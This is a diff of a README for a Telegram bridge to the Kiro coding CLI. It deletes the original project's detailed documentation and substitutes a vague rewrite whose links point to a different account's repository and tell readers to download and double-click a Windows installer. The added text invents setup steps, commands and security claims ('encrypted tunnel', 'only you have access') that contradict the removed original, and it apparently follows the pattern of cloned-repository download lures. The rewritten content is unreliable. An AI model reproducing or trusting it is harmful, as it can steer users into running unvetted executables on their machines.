@@ -1,556 +1,91 @@
-# Kiro Telegram Bot 🤖
+# 🤖 kiro-telegram-bot - Manage your coding sessions from Telegram
 
-> **Control [Kiro CLI](https://kiro.dev/cli/) from Telegram.** Your AI coding
-> assistant in your pocket — switch projects, resume and attach to live coding
-> sessions, stream answers with diffs, queue follow-ups, and run it 24/7 as a
-> background service on Windows, Linux, and macOS.
+[![](https://img.shields.io/badge/Download-Kiro_Telegram_Bot-blue)](https://github.com/Ryoowa1303/kiro-telegram-bot)
 
-![Node](https://img.shields.io/badge/node-%3E%3D20-339933?logo=node.js&logoColor=white)
-![Platforms](https://img.shields.io/badge/platforms-Windows%20%7C%20Linux%20%7C%20macOS-blue)
-![License](https://img.shields.io/badge/license-MIT-green)
-![Protocol](https://img.shields.io/badge/protocol-ACP-orange)
+This software links your Telegram account to your Kiro coding setup. It allows you to control coding projects, start sessions, and track progress from your mobile device. The bot functions as a bridge between your phone and your computer. It maintains a constant connection so your tools stay active even when you step away from your desk.
 
-A professional Telegram bridge for the **Agent Client Protocol (ACP)** that
-turns Kiro CLI into a mobile, always-on AI pair programmer. Send a message from
-anywhere and watch Kiro read files, run commands, and edit code on your machine
-— with live typing indicators, clean Telegram markdown, and unified edit diffs.
+## ⚙️ System Requirements
 
-Inspired by [`ajitnk-lab/kiro-acp-telegram-bot`](https://github.com/ajitnk-lab/kiro-acp-telegram-bot)
-and extended into a full multi-session client.
+Your computer needs to meet these basic standards to run the software.
 
----
+*   Windows 10 or Windows 11.
+*   An active Telegram account.
+*   The Kiro CLI installed on your machine.
+*   An internet connection to maintain the bridge between your computer and the Telegram servers.
+*   At least 200 MB of free storage space for the background service.
 
-## ✨ Features
+You should have your Kiro CLI set up before you start this process. If you have not set up your coding environment, complete that task first.
 
-| Capability | What it does |
-|---|---|
-| 🗂 **Projects** | `/projects` browses your folders and runs Kiro in the one you pick. |
-| ♻️ **Resume sessions** | `/sessions` lists recent Kiro sessions; tap to resume via ACP `session/load`. |
-| 🟢 **Connect to live sessions** | `/active` shows sessions running **right now** on your PC. Watch them live, or continue them — see below. |
-| 🛑 **Kill a session / PID** | Each live `/sessions` · `/active` card has a **🛑 Kill · pid N** button (confirm-guarded) that stops that session's process and its child tree; `/killall` stops them all. The bot's own agent is never killable. |
-| 📡 **Live watch** | Follow a running session read-only in real time (tails its event log). |
-| 🧭 **Always-visible menu** | A persistent keyboard plus a pinned status panel that always shows your current **project, agent, reasoning effort, model, session and queue**. |
-| ⏰ **Scheduled tasks** | Create prompts that run on a schedule (once / daily / weekly / monthly / every-N-minutes) in a chosen project, delivered back to your chat. |
-| 🖼 **Multi-image prompts** | Send one or many photos (albums included) with a caption — all attached to the prompt for the agent to analyze. |
-| 📜 **History** | `/history` shows the latest messages of any session. |
-| 🧩 **MCP control** | `/mcp` lists MCP servers, **health-checks** them (which connected / failed and why), and **enables/disables** them — then restarts the agent to apply. |
-| 👥 **Subagent visibility** | When Kiro delegates to subagents and waits on them, you see each one **start / work / finish** plus a live `🤖 N running` summary — and subagent permission prompts route to your chat. |
-| 📈 **Task progress bar** | The agent appends a `{progress: N%}` marker; the bot hides it and shows a **green 0–100% loading bar** on the live message, in the status panel, and on session cards (`SHOW_PROGRESS`). |
-| 🔐 **Re-auth from chat** | `/reauth` logs out and runs a device-flow login (URL + code streamed to your chat), then restarts the agent — no terminal needed. |
-| ⌨️ **Typing indicator** | Stays on for the whole turn, even through long tool chains. |
-| 📥 **Queued follow-ups** | Message while Kiro is busy — it's queued and runs next. `/btw` runs it ASAP (now if idle, else right after the current task); `/flush` runs the queue now. |
-| ✏️ **Edit diffs** | File edits show as unified `diff` blocks with `+N -M` stats. |
-| 💬 **Quality markdown** | Converts agent markdown to Telegram **MarkdownV2** with safe escaping and code-fence-aware splitting. |
-| 🔁 **Self-healing** | Auto-restarts the Kiro agent with backoff and re-binds your session. |
-| 🖥 **Runs 24/7** | 1-click install as a background service that starts on boot — Windows, Linux, macOS, auto-detected. |
-| 🔒 **Access control** | Restrict to specific Telegram user IDs. |
+## 📥 Download and Setup
 
----
+Follow these instructions to get the application onto your system.
 
-## 📊 How it compares
+[Click here to visit the release page and download the software.](https://github.com/Ryoowa1303/kiro-telegram-bot)
 
-| Capability | **This bot** | Other Kiro Telegram bots |
-|---|:---:|:---:|
-| Connect Kiro CLI to Telegram (ACP) | ✅ | ✅ |
-| Switch between projects | ✅ | ❌ |
-| Resume saved sessions | ✅ | ❌ |
-| Attach to **live** PC sessions (watch / fork) | ✅ | ❌ |
-| **Kill a session by PID** (or all at once) | ✅ | ❌ |
-| **Live task-progress bars** (`{progress: N%}`) | ✅ | ❌ |
-| **Re-authenticate from chat** (`/reauth`, device flow) | ✅ | ❌ |
-| Multiple isolated sessions | ✅ | ❌ (single shared) |
-| Queued follow-ups while busy | ✅ | ❌ |
-| **Scheduled tasks** (cron-like) | ✅ | ❌ |
-| **Multi-image** prompts (albums) | ✅ | ❌ |
-| Unified **edit diffs** | ✅ | ❌ |
-| Persistent menu + live status panel | ✅ | ❌ |
-| Agent / reasoning / model menus | ✅ | ❌ |
-| Combined, throttled output (no spam) | ✅ | ❌ |
-| Auto-restart + session re-bind | ✅ | ❌ |
-| 24/7 cross-platform service | ✅ | ❌ |
-| 1-click install | ✅ | ❌ |
+1.  Navigate to the link provided above.
+2.  Look for the section marked Releases on the right side of the page.
+3.  Choose the version labeled for Windows.
+4.  Download the compressed folder to your computer.
+5.  Extract the files into a new folder on your desktop.
+6.  Double-click the installer file to begin the setup process.
+7.  Follow the prompts on your screen to complete the installation.
 
----
+The installer creates a background service. This service runs quietly on your machine so the bot stays connected. You do not need to keep a terminal window open for the bot to work.
 
-## ⚡ Install from npm
+## 🔑 Initial Configuration
 
-The fastest way — one command installs the global **`kiro-tg`** CLI (ships with
-the `tsx` runtime, no build step):
+The bot needs permission to access your Telegram account. It uses the Agent Client Protocol to send commands.
 
-```bash
-npm install -g kiro-telegram-bot
-```
+1.  Open your Telegram app.
+2.  Search for your bot username in the search bar.
+3.  Press the Start button in the chat window.
+4.  The bot will send you a verification code.
+5.  Return to your computer and open the application settings.
+6.  Enter the code you received into the provided text field.
+7.  Save your settings to finalize the connection.
 
-Everything operates on the **current folder** (its `.env`, `logs/`, `data/`), so
-keep one folder per bot:
+The bot is now ready to send commands to your coding environment. You can test the connection by sending the command /status to the bot. If the setup is correct, the bot will show your current workspace information.
 
-```bash
-mkdir my-bot && cd my-bot
-kiro-tg setup            # auto-detects kiro-cli, writes ./.env
-# edit .env: set TELEGRAM_BOT_TOKEN and ALLOWED_USERS
-kiro-tg run              # foreground …
-kiro-tg install          # … or install as a 24/7 background service
-```
+## 🛠️ Bot Features
 
-Startup options: `kiro-tg setup | run | install | status | logs [n] | stop |
-restart | uninstall`. Or try it without installing: `npx kiro-telegram-bot
-setup`. See **[docs/INSTALL.md](./docs/INSTALL.md)** for the full guide.
+The bot handles many tasks to simplify your work.
 
----
+### Manage Projects
+You can switch between projects using the bot. Use the /projects command to see a list of your open items. Select the project you want to work on, and the bot will switch your Kiro CLI context.
 
-## 🚀 1-click install
+### Resume Sessions
+If you close your laptop, your sessions persist in the background. Use the /resume command to return to your work exactly where you left off. The bot attaches to the live session and provides a summary of the current status.
 
-Clone or download, then run the installer for your OS. It installs
-dependencies, auto-detects `kiro-cli`, writes `.env`, asks for your bot token,
-and optionally sets up the background service.
+### Receive Updates
+The bot streams responses back to your phone. It displays differences in code so you can track what changes occur. If the system processes a large task, it queues follow-up messages. You will receive notifications as the work completes.
 
-**Windows** — double-click `install.cmd` (or in a terminal):
+### 24/7 Availability
+The background service runs automatically when you start your computer. This creates a persistent link to your machine. You can check your code or run commands while away from your desk.
 
-```powershell
-.\install.cmd
-```
+## 🖱️ Using the Bot
 
-**Linux / macOS**:
+Operating the bot requires basic text commands. You provide these commands in the chat interface on Telegram.
 
-```bash
-chmod +x install.sh && ./install.sh
-```
+*   /help: Shows a full list of available commands.
+*   /attach: Connects your phone to an active coding session.
+*   /detach: Safely stops tracking the current session.
+*   /diff: Requests a summary of code changes in the active session.
+*   /restart: Reboots the background service if you experience connectivity issues.
 
-### Prerequisites
+## 🛡️ Privacy and Security
 
-- **Kiro CLI** installed and authenticated — run `kiro-cli chat` once to confirm.
-- **Node.js 20+**.
-- A **bot token** from [@BotFather](https://t.me/BotFather).
-- Your **Telegram user ID** from [@userinfobot](https://t.me/userinfobot).
+The bot uses the Agent Client Protocol to translate your messages into actions. This process does not store your source code on any external server. The data travels between your Telegram app and your computer via an encrypted tunnel. 
 
----
+Your desktop application acts as the host. All commands happen locally on your hardware. Only you have access to your bot. Do not share your Telegram account credentials with anyone else, as this gives them control over your local coding environment.
 
-## 🧑‍💻 Manual setup
+## 🔧 Troubleshooting
 
-```bash
-npm install
-npm run setup            # auto-detects kiro-cli + project roots, writes .env
-# edit .env: set TELEGRAM_BOT_TOKEN and ALLOWED_USERS
-npm start
-```
+If you encounter issues, review these common fixes.
 
-No build step — TypeScript runs directly via `tsx`.
+*   Connection Error: Check your internet connection. Ensure the background service is running by checking your System Tray icons.
+*   Slow Responses: A slow internet connection might delay the stream. Wait a moment for the queued follow-up messages to arrive.
+*   Commands Not Working: Verify your Kiro CLI is up to date. The bot relies on the latest version of the command-line interface to work correctly.
+*   Bot Unresponsive: Use the /restart command in Telegram. This clears the network cache and reconnects to the local service.
+*   Setup Failure: Ensure that your firewall allows the application to communicate with the network. You might need to add an exception for the service in your Windows Security settings.
 
----
-
-## 🛠 Run as a background service (daemon)
-
-The bot installs as a **user-level** service that starts automatically on boot.
-The platform is auto-detected:
-
-| OS | Mechanism | Starts on |
-|---|---|---|
-| Windows | Hidden Scheduled Task (elevated) · per-user **Startup folder** (no admin) | logon |
-| Linux | systemd **user** service (+ linger) | boot |
-| macOS | launchd LaunchAgent | login |
-
-On Windows, registering a logon-triggered Scheduled Task needs admin, so from a
-normal terminal `kiro-tg install` falls back to a hidden launcher in your
-per-user **Startup folder** (starts at logon, no elevation). Run it from an
-**elevated** terminal to use the Scheduled Task instead; either way `status`,
-`stop`, `restart` and `uninstall` work the same.
-
-```bash
-npm run install:service     # install + start, enable autostart
-npm run service -- status   # show install + running state
-npm run service -- stop
-npm run service -- restart
-npm run service -- logs 200 # tail the log file
-npm run uninstall:service   # stop + remove
-```
-
-Or use the `kiro-tg` command (if linked): `kiro-tg install | status | logs`.
-
-Logs are written to `logs/kiro-telegram-bot.log` (rotated at 5 MB).
-
----
-
-## 💬 Commands
-
-```
-/menu         Show the persistent menu keyboard
-/projects     List · /projects <q> search · /projects <path> open any folder · /projects new <name>
-/sessions     List & resume sessions (active first) · /sessions <q> to filter
-/active       Sessions running now on the PC
-/running      Sessions this chat controls — switch between them
-/killall      Kill all active sessions on the PC (with confirm)
-/mcp          Inspect MCP servers · health-check · enable/disable
-/tasks        Manage scheduled tasks
-/newtask      Create a scheduled task (wizard)
-/history      Show recent conversation history
-/new          Start a fresh session here
-/status       Current session, project & queue
-/usage        Account info & current context usage
-/btw <text>   Run it now if idle, else queue to run right after the current task
-/flush        Send queued follow-ups now
-/queue        Show queued follow-ups
-/clearqueue   Clear the queue
-/cancel       Stop the current turn
-/unwatch      Stop following a live session
-/model <id>   Switch the model for this session
-/restart      Restart the Kiro agent
-/reauth       Log out & log in to Kiro (device flow) · /reauth --license free|pro …
-/help         Show help
-```
-
-Anything that isn't a command is sent to Kiro as a prompt. While a turn is
-running, your messages are queued and sent automatically when it finishes.
-
----
-
-## 🧭 The menu & status panel
-
-A tiny **persistent bar** sits under the message box — **☰ Menu · 🧭 Running ·
-⏹ Stop** — so common actions are one tap away without clutter. Tap **☰ Menu**
-(or `/menu`) to open a clean, grouped **inline menu**: Project · New · Running ·
-Sessions · Agent · Model · Reasoning · Tasks · Status · Usage · Stop · Kill all.
-The bar can be hidden (🙈) and restored (⌨️ Show bar or `/menu`).
-
-A **pinned status panel** at the top of the chat always shows your current
-**project, agent, reasoning effort, model, session id, context %, task progress,
-activity and queue** (and how many sessions the chat controls), updating live.
-Pick **Agent**, **Reasoning** or **Model** from the inline menu (reasoning steers
-how thoroughly the agent works: Minimal → Max).
-
-## ⏰ Scheduled tasks
-
-A task is a **prompt + a project + a schedule**. When it fires, the bot opens a
-session in that project, runs the prompt, and delivers the result to your chat.
-
-- **/newtask** (or the ➕ button) launches a guided wizard: name → prompt →
-  project → schedule → confirm.
-- **Schedules**: `once` at a date/time, `daily` at HH:MM, `weekly` (e.g. `Mon 09:00`),
-  `monthly` (e.g. `15 09:00`), or `interval` (every N minutes).
-- **/tasks** lists everything with buttons to **run now, enable/disable, edit**
-  (rename, prompt, project, reschedule) and **delete**.
-
-Tasks are stored in `data/tasks.json` and survive restarts; the scheduler runs
-them whether you're online or not (great with the 24/7 service).
-
-## 🖼 Sending images
-
-Send one or several photos — including a Telegram **album** — with an optional
-caption. The bot downloads them and attaches them all to the prompt as image
-content blocks, so the agent can analyze them together. Images sent while Kiro
-is busy are queued with your next turn.
-
-**Images come back too:** when the agent produces images during a turn (e.g.
-takes screenshots while testing an app), the bot detects the freshly-written
-files and sends them back to Telegram automatically (`SEND_AGENT_IMAGES`).
-
-## 🎙 Sending voice
-
-Send a voice note (or audio file) and the bot transcribes it and runs it as a
-prompt. Configure any OpenAI/Whisper-compatible endpoint via `STT_API_URL` in
-`.env`; leave `STT_LANGUAGE` blank for automatic detection (English, Russian,
-Romanian/Moldovan, and ~100 more).
-
-## 📈 Task progress
-
-The bot asks the agent to end each message with a `{progress: N%}` marker, then
-**hides the marker** and renders a **green loading bar** from 0–100 %
-(`🟩🟩🟩🟩🟩⬜⬜⬜⬜⬜ 50%`, all-green ✅ at 100 %) so you can see how far along the
-current task is. The bar appears at the bottom of the **live message**, in the
-pinned **status panel**, and on **`/running` and `/sessions` cards**. Markers are
-also stripped from history, replays and previews, so the raw plumbing never
-shows. Turn it off with `SHOW_PROGRESS=false`.
-
-## 🔐 Re-authenticating Kiro
-
-Run **`/reauth`** to log out and start a fresh **device-flow** login without
-touching a terminal: the verification URL + code are streamed into the chat
-(open them on any device), and once you're logged in the agent is restarted to
-pick up the new credentials. It's refused while a turn is running, and you can
-pass login flags through, e.g. `/reauth --license free` or
-`/reauth --license pro --region <r> --identity-provider <url>`.
-
----
-
-## 🧭 Working on several sessions at once
-
-One chat can drive **multiple Kiro sessions** and switch between them. Start a
-session (📁 Project / 🆕 New), and each becomes a "controlled" session. Tap
-**🧭 Running** (or `/running`) to switch: the foreground session streams live
-while the others keep working quietly. When you switch to a session you see its
-recent context and **every message that arrived while you were away** (its
-unread, recovered from the session log). Leave a task running in A, hop to B,
-reply, and come back to A to read what it did. Close a session with ✖ (it isn't
-killed) — or tap **🛑 Kill · pid N** on its `/sessions` · `/active` card to stop
-its process (and `/killall` to stop them all).
-
-## 🔗 Connecting to live sessions
-
-Kiro keeps an **exclusive lock** on a session while it's running, so a second
-client cannot hijack a session that's open in another window. This bot handles
-that honestly:
-
-- **📡 Watch** — follow the running session's output live (read-only) by tailing
-  its event log. Stop with `/unwatch`.
-- **Continue (fork)** — tapping a live session opens a **linked continuation** in
-  the same project, primed with the recent transcript, so you can keep
-  interacting from Telegram without disturbing the original.
-
-Resuming an **idle** session loads it directly so you continue the exact thread.
-
----
-
-## ⚙️ Configuration (`.env`)
-
-| Variable | Required | Default | Description |
-|---|---|---|---|
-| `TELEGRAM_BOT_TOKEN` | **yes** | — | Bot token from @BotFather. |
-| `ALLOWED_USERS` | recommended | *(all)* | Comma-separated Telegram user IDs. Empty = anyone (unsafe). |
-| `KIRO_CLI_PATH` | no | auto / `kiro-cli` | Path to the `kiro-cli` binary. |
-| `KIRO_WORKSPACE` | no | cwd | Default working directory. |
-| `KIRO_AGENT` | no | — | Custom agent from `.kiro/agents/`. |
-| `KIRO_TRUST_ALL_TOOLS` | no | `true` | Run tools without prompts. |
-| `PROJECT_ROOTS` | no | workspace parent + home | Roots for `/projects`. |
-| `STREAM_THROTTLE_MS` | no | `1200` | Live-edit interval while streaming. |
-| `MESSAGE_BATCH_MS` | no | `800` | Window to coalesce rapid text messages (e.g. a long message Telegram split at 4096 chars) into one prompt. `0` disables. |
-| `SHOW_TOOL_CALLS` | no | `true` | Show tool-call status messages. |
-| `SHOW_EDIT_DIFFS` | no | `true` | Show unified diffs for edits. |
-| `DIFF_MAX_LINES` | no | `120` | Max diff lines shown inline. |
-| `SHOW_SUBAGENTS` | no | `true` | Stream subagent (crew) start/work/finish while the main agent waits. |
-| `SHOW_PROGRESS` | no | `true` | Ask the agent to append a `{progress: N%}` marker to each message; the bot parses it, hides the marker, and renders a green 0–100% bar on the live message, in session cards, and in the status panel. |
-| `NOTIFY_OTHER_SESSIONS` | no | `true` | Deliver a session's "Done" summary (with a short created/edited/deleted count) even when it's a background session, marked "From other session". `false` keeps background sessions silent. |
-| `MCP_PROBE_TIMEOUT_MS` | no | `8000` | Per-server timeout for the `/mcp` live health-check. |
-| `MCP_PROBE_CONCURRENCY` | no | `6` | How many MCP health probes run at once. |
-| `ACP_AUTO_RESTART` | no | `true` | Auto-restart the agent if it exits. |
-| `AUTO_UPDATE` | no | `true` | Hourly check npm and, when a newer version exists **and the bot is idle** (no turn/task running, no other active Kiro session), auto-update + restart + post the release notes (tagged `#update`). Global npm installs only. |
-| `UPDATE_CHECK_MS` | no | `3600000` | How often to check npm for updates (ms). |
-| `PROMPT_RETRY_ATTEMPTS` | no | `5` | Max retries for a transient agent error (e.g. high-traffic / `Internal error`) before any output streamed, with `6s → 12s → 24s → 48s → 60s` backoff. The real error shows each attempt; a summary after the last. `0` disables. |
-| `AUTO_FORK_ON_ERROR` | no | `true` | When the retries above are exhausted on a transient error (throttle / `Internal error` / exhausted context) and nothing streamed, **logically fork** the session — open a fresh continuation primed with the recent transcript, drop the stuck session, and retry the message once. |
-| `AUTO_FORK_CONTEXT_PCT` | no | `85` | When a prompt fails transiently **and** the session's last-known context usage is at/above this %, **skip the retry backoff and fork immediately** — a context-exhausted session won't recover by retrying the same oversized prompt (throttling on a near-full session shows up as `-32603 … throttled`). Forking compacts it into a fresh continuation primed with the recent transcript. Requires `AUTO_FORK_ON_ERROR`; `0` disables this trigger. |
-| `LOG_LEVEL` | no | `info` | `debug` \| `info` \| `warn` \| `error`. |
-| `LOG_DIR` / `LOG_FILE` | no | `<project>/logs/…` | Log location. |
-
----
-
-## 🧩 How it works
-
-```
-Telegram  ──HTTPS──▶  Bot (grammY)
-                         │  spawns once
-                         ▼
-                 kiro-cli acp  ◀── JSON-RPC 2.0 over stdio ──▶  Bot
-                         │
-                         ├─ session/new / session/load   (projects, resume)
-                         ├─ session/prompt               (your messages)
-                         └─ session/update notifications (streamed text, tools)
-```
-
-One `kiro-cli acp` process multiplexes many sessions (one per chat/project).
-Streamed `agent_message_chunk` updates are assembled into a live, throttled
-message; `tool_call` updates render as professional status lines with diffs.
-
-Kiro persists sessions to `~/.kiro/sessions/cli/`:
-`<id>.json` (metadata), `<id>.jsonl` (history, used by `/history` and live
-watch), and `<id>.lock` (`{ pid }`, used to detect active sessions).
-
----
-
-## 📁 Project layout
-
-```
-src/
-├── index.ts              Entry point, daemon-friendly logging, shutdown
-├── cli.ts                CLI: run / install / start / stop / status / logs
-├── config.ts             .env loading, paths, daemon options
-├── logger.ts             Leveled logger with file output
-├── acp/                  ACP client, transport, server-side handlers, types
-├── sessions/             Session discovery, history parser, live tail watcher
-├── projects/             Project directory discovery
-├── mcp/                  MCP config (list/toggle) + live health probe
-├── render/               Markdown→MarkdownV2, diffs, tool formatting, chunking
-├── stream/               Incremental edit-streaming
-├── service/              Cross-platform daemon (windows/linux/macos + selector)
-└── bot/                  grammY bot, per-chat runtime, handlers
-```
-
----
-
-## ❓ FAQ
-
-**Can I run the Kiro Telegram bot 24/7 on a server?** Yes — `npm run install:service`
-installs a user-level service (systemd/launchd/Scheduled Task) that starts on
-boot and auto-restarts on crash.
-
-**How do I control Kiro from my phone?** Set up the bot, message it on Telegram,
-and pick a project with `/projects`. Every message becomes a Kiro prompt.
-
-**Can multiple people use one bot?** Add their IDs to `ALLOWED_USERS`. Each chat
-gets its own session.
-
-**Why can't I take over a session that's already running?** Kiro locks active
-sessions exclusively. The bot lets you **watch** it live or **fork** a linked
-continuation instead. See "Connecting to live sessions".
-
-**Does it support custom agents and MCP servers?** Yes — set `KIRO_AGENT`, and
-the bot inherits whatever MCP servers Kiro CLI is configured with.
-
----
-
-## 🔐 Inline approvals
-
-The bot implements ACP `session/request_permission`: when Kiro asks the client
-to approve a risky tool call, it appears in Telegram with **Approve / Approve
-always / Deny** buttons and your choice is sent back (unanswered prompts time
-out and are denied).
-
-> Note: Kiro CLI 2.8.1 resolves tool permissions internally (via
-> `~/.kiro/settings/permissions.yaml` and agent config) and does **not** yet
-> delegate them over ACP, so these prompts stay dormant on current Kiro. The
-> wiring is forward-compatible and activates automatically when Kiro emits
-> permission requests. Today, use the live tool stream + **⏹ Stop** to
-> intervene, and `permissions.yaml` to govern what Kiro may do.
-
-## 🔐 Security
-
-This bot lets authorized Telegram users run commands and edit files on the host.
-**Always set `ALLOWED_USERS`**, keep `.env` private, and run as a non-privileged
-user. See [SECURITY.md](./SECURITY.md) for the full model.
-
----
-
-## 🗺 Roadmap
-
-- [x] Projects, resume & attach to live sessions
-- [x] Queued follow-ups, edit diffs, quality MarkdownV2
-- [x] Persistent menu + live status panel (project / agent / reasoning / model)
-- [x] Scheduled tasks (once / daily / weekly / monthly / interval)
-- [x] Multi-image prompts (albums)
-- [x] Combined, throttled output (anti-spam)
-- [x] 24/7 cross-platform background service
-- [x] Voice messages → speech-to-text → prompt (multi-language)
-- [x] Context-usage % in the status panel
-- [x] Inline approvals — approve/deny risky tools from buttons (non trust-all mode)
-- [x] Account & context usage (`/usage`)
-- [x] Release automation — downloadable zip + CHANGELOG-driven notes on tag push
-- [x] README community sections — Contributors, Top Contributors, Stars, StarMapper
-- [ ] **Token & cost meter** — per-session token counts and an estimated spend tally
-- [ ] **Text-to-speech replies** — optionally speak answers back as voice notes
-- [ ] **Scheduled-task chaining & conditions** — run task B after A, or only if a command/file check passes
-- [ ] **Team mode** — multiple authorized users with per-user sessions, roles, and an audit log
-- [ ] Localized bot UI (i18n)
-- [ ] Docker image with `kiro-cli` preinstalled
-- [ ] Webhook mode for serverless deployment
-
-Have an idea? Open a [feature request](../../issues/new/choose).
-
-## 🤝 Contributing
-
-Contributions are very welcome! See **[CONTRIBUTING.md](./CONTRIBUTING.md)** to get
-started — no build step is required (`npm run dev`), and `npm run typecheck` must
-pass.
-
-New here? Look for issues labeled
-[**good first issue**](../../issues?q=is%3Aopen+label%3A%22good+first+issue%22)
-and [**help wanted**](../../issues?q=is%3Aopen+label%3A%22help+wanted%22).
-
-By participating you agree to the [Code of Conduct](./CODE_OF_CONDUCT.md).
-
----
-
-## 👥 Contributors
-
-[![Contributors](https://contrib.rocks/image?repo=artickc/kiro-telegram-bot&max=100&columns=20&anon=1)](https://github.com/artickc/kiro-telegram-bot/graphs/contributors)
-
-### How to Contribute
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feat/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feat/amazing-feature`)
-5. Open a Pull Request
-
-See [CONTRIBUTING.md](./CONTRIBUTING.md) for detailed guidelines.
-
-### Releasing a New Version
-
-```bash
-# Bump the version, update CHANGELOG.md, then push a tag.
-# The release workflow builds a downloadable zip and publishes notes automatically.
-npm version minor              # or: patch / major — updates package.json + commits
-git push --follow-tags         # pushing the v* tag triggers .github/workflows/release.yml
-```
-
----
-
-## ⭐ Top Contributors
-
-> This project is built and maintained in the open. These people have made the
-> contributions that shape its quality, stability, and reach. **Thank you.**
-
-<table>
-  <tr>
-    <td align="center" width="180">
-      <a href="https://github.com/artickc">
-        <img src="https://github.com/artickc.png?size=100" width="80" height="80" style="border-radius:50%" alt="artickc"/><br/>
-        <sub><b>artickc</b></sub>
-      </a><br/>
-      🥇 Maintainer<br/>
-      <sub>Created the bot: ACP client, multi-session<br/>runtime, scheduler, daemon &amp; renderer</sub>
-    </td>
-  </tr>
-</table>
-
-> 🙏 Every pull request, bug report, and idea matters. Open source is built by
-> people like them — see the full list under [Contributors](#-contributors).
-
----
-
-## 📊 Stars
-
-<a href="https://www.star-history.com/?repos=artickc%2Fkiro-telegram-bot&type=date&legend=top-left">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=artickc/kiro-telegram-bot&type=Date&theme=dark&legend=top-left" />
-    <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=artickc/kiro-telegram-bot&type=Date&legend=top-left" />
-    <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=artickc/kiro-telegram-bot&type=Date&legend=top-left" />
-  </picture>
-</a>
-
-If this project helps you, please consider giving it a ⭐ — it really helps!
-
----
-
-## 🌍 StarMapper
-
-> See where in the world this project's stargazers live — an interactive map of
-> the community.
-
-<a href="https://starmapper.bruniaux.com/artickc/kiro-telegram-bot">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://starmapper.bruniaux.com/api/map-image/artickc/kiro-telegram-bot?theme=dark" />
-    <source media="(prefers-color-scheme: light)" srcset="https://starmapper.bruniaux.com/api/map-image/artickc/kiro-telegram-bot?theme=light" />
-    <img alt="StarMapper — where this project's stargazers live" src="https://starmapper.bruniaux.com/api/map-image/artickc/kiro-telegram-bot" />
-  </picture>
-</a>
-
----
-
-## 📦 Download & Releases
-
-Grab the latest packaged build from the
-[**Releases**](https://github.com/artickc/kiro-telegram-bot/releases) page — each
-release ships a clean `kiro-telegram-bot-<version>.zip` (no `node_modules` or
-secrets) plus GitHub's source archives. See [CHANGELOG.md](./CHANGELOG.md) for
-what changed in each version, and **[docs/INSTALL.md](./docs/INSTALL.md)** for the
-full 1-click install guide.
-
----
-
-## 📄 License
-
-[MIT](./LICENSE) — see also [CONTRIBUTING](./CONTRIBUTING.md) and
-[Code of Conduct](./CODE_OF_CONDUCT.md).
-
----
-
-<sub>Keywords: Kiro CLI Telegram bot, ACP Agent Client Protocol, AI coding
-assistant on Telegram, mobile AI pair programming, remote coding agent, run AI
-agent as a service, Windows/Linux/macOS daemon, ChatOps for developers.</sub>
+If the problem persists, restart your computer. This forces the background service to refresh its temporary files and re-establish a stable link.
